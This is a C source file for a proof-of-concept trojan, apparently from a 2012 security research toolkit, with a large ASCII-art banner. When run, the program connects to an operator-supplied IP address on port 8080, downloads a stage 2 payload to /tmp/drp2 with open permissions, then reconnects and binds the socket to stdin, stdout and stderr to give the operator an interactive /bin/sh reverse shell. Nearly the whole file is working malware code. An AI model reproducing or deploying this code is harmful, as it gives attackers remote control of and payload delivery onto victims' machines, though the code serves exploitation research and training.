/* 
 * *******************************************************************************
 * *******************************************************************************
 * *****************       These warez are licensed GPLv2.        ****************
 * *********************    So share and respect.  Peace.   **********************
 * *******************   See included LICENSE for more info.   *******************
 * *******************************************************************************
 * *******************************************************************************
 * ************************                               ************************
 * ************                                                       ************
 * *********     #####   ######   #######  #######  #######  #######     *********
 * *******      #     #  #     #  #        #           #          #        *******
 * *******      #        #     #  #        #           #         #         *******
 * *******      #  ####  ######   #####    #####       #        #          *******
 * *******      #     #  #   #    #        #           #       #           *******
 * *******      #     #  #   #    #        #           #       #           *******
 * *******       #####   #     #  #######  #######     #     #######       *******
 * *********                                                             *********
 * ************                                                       ************
 * ************************  From your leet hacking cr3w  ************************
 * *******************************                 *******************************
 * **********************************    at     **********************************
 * *******************************                 *******************************
 * ****                                                                       ****
 * ****   TTTTTTTTTTTTTTTTTTTTTTTNNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS   ****
 * ****   T:::::::::::::::::::::TN:::::::N       N::::::N SS:::::::::::::::S  ****
 * ****   T:::::::::::::::::::::TN::::::::N      N::::::NS:::::SSSSSS::::::S  ****
 * ****   T:::::TT:::::::TT:::::TN:::::::::N     N::::::NS:::::S     SSSSSSS  ****
 * ****   TTTTTT  T:::::T  TTTTTTN::::::::::N    N::::::NS:::::S              ****
 * ****           T:::::T        N:::::::::::N   N::::::NS:::::S              ****
 * ****           T:::::T        N:::::::N::::N  N::::::N S::::SSSS           ****
 * ****           T:::::T        N::::::N N::::N N::::::N  SS::::::SSSSS      ****
 * ****           T:::::T        N::::::N  N::::N:::::::N    SSS::::::::SS    ****
 * ****           T:::::T        N::::::N   N:::::::::::N       SSSSSS::::S   ****
 * ****           T:::::T        N::::::N    N::::::::::N            S:::::S  ****
 * ****           T:::::T        N::::::N     N:::::::::N            S:::::S  ****
 * ****         TT:::::::TT      N::::::N      N::::::::NSSSSSSS     S:::::S  ****
 * ****         T:::::::::T      N::::::N       N:::::::NS::::::SSSSSS:::::S  ****
 * ****         T:::::::::T      N::::::N        N::::::NS:::::::::::::::SS   ****
 * ****         TTTTTTTTTTT      NNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS     ****
 * ****                                                                       ****
 * ****                                                                       ****
 * ************                http://www.tacnetsol.com                ***********
 * ***************                                                  **************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMWo,:OMMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMK.    ;MMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMX,''''cMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMNxxkWM;    0MMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMM,   cM'    xMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMM0.o,.'   :X.    lMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMXcO:.'   ;k     ;MMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMXoKc.'   ;x     .MMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMM0.c..'   ;o     .MMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMWOlod'   ;l      O0MMMMMN0MMMMMMMM**************
 * ***************MMMMMMMMMMMMMMM0lllld;...''......,',:;. .cNMMMMMMM**************
 * ***************MMMMMMMMMMMMMOlllo:.   ...............,0MMMMMMMMMM**************
 * ***************MMMMMMMMMMMOllllll;:l;   ,xXX0XXXooooollOMMMMMMMMM**************
 * ***************MMMMMMMMMOlllc;;'.,.,'   ,oMMKMMMlllllllllOMMMMMMM**************
 * ***************MMMMMMMOlc;,..'... .''   ,oMMKMMM;,;llllllllkWMMMM**************
 * ***************MMMMMOl:'.'.....  . .'   ,oMMKMMM;''',clllllllkWMM**************
 * ***************MMMOl:'.... ..   .  .'   ,oMMKMMM' ..'.'cllllllckW**************
 * ***************MMdc'....  ..   .   .'   ,oMMKMMM'..  ..',llllllcx**************
 * ***************MMMXl... ..    .    .'   ,oMMKMMM. .. .....cllcxNM**************
 * ***************MMMMMXc  .     .    .'   ,oMMKMMM.  .   ....cxNMMM**************
 * ***************MMMMMMMNl     .     .'   ,oMMKMMM'   .   . oNMMMMM**************
 * ***************MMMMMMMMMNc   .  .........;xKKMMM.    . .lNMMMMMMM**************
 * ***************MMMMMMMMMMMNl ...    .....   .cXM.    .lNMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMN; ....,  . .lkx;  k.   oWMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMK 'k.    ..  oMMKx .;.dWMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMN .KWo.      oMMXc .xWMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMM0. .,''... ',;,  ,NKMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMO:.   ...   .:KMMKMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMWKOkkx;lWMKMMMKMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMKWMKMMKWMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMKWKMNXMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOXNMMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWMMMMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
 * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
 * *******************************************************************************
 * *******************************************************************************
 * (c) 2012 Zachary Cutlip <zcutlip@tacnetsol.com,
 *          Tactical Network Solutions, LLC
 *
 *
 * This is a proof-of-concept trojan for use with the accompanying trojan-dropping
 * shellcode and trojan server.  
 * It should be compiled for whatever the target sytem is and served up in response
 * to the shellcode's connection.
 * This program, when executed, will connect to the stage 2 drop server, read 
 * whatever is served up and write that data to /tmp/drp2.  It will then reconnect to 
 * the server, giving the operator an interactive /bin/sh.
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define STAGE2_DROP "/tmp/drp2"

int main(void)
{
    char *ex[4];
    int s;
    struct sockaddr_in s4;
    char inbuf[512];
    size_t rb;
    int out_fd;

#ifdef DAEMON
    daemon(0,1);
#endif

    s4.sin_family=AF_INET;

    s4.sin_port=htons(8080);
    s4.sin_addr.s_addr=inet_addr(IPADDRESS);

    s=socket(AF_INET,SOCK_STREAM,0);

    out_fd = open(STAGE2_DROP,O_CREAT|O_WRONLY|O_SYNC,S_IRWXU|S_IRWXG|S_IRWXO);
    if(0 > out_fd)
    {
        printf("failed to create stage 2 drop file.\n");
        exit(1);
    }

    printf("sleeping to ensure drop server is up.\n");
    rb=0;
    while(rb < 10)
    {
        rb++;
        fprintf(stderr,"\r%.*s",rb,"..........");
        usleep(500000);

    }

    printf("\n");

    printf("fetching drop file.\n");

    if(connect(s,(struct sockaddr *)&s4,sizeof(struct sockaddr_in)))
    {
        printf("error connecting to stage 2 drop server. Sorry it didn't work out.\n");
        exit(1);
    }

    rb=0;
    do
    {
        /* yup. first write is 0. suck it. */
        write(out_fd,inbuf,rb);
        rb=read(s,inbuf,512);

    }while(rb>0);

    close(s);
    close(out_fd);

    s=socket(AF_INET,SOCK_STREAM,0);

    printf("connecting to callback server.\n");
    if(connect(s,(struct sockaddr *)&s4,sizeof(struct sockaddr_in)))
    {
        printf("error connecting to callback shell server. Sorry it didn't work out.\n");
        exit(1);
    }


    dup2(s,0);
    dup2(s,1);
    dup2(s,2);
    ex[0]="/bin/sh";
    ex[1]=NULL;
    execve(ex[0],ex,NULL);

    printf("execve() failed.\nInsert 25Â¢ to play again.");
    exit(1);
}

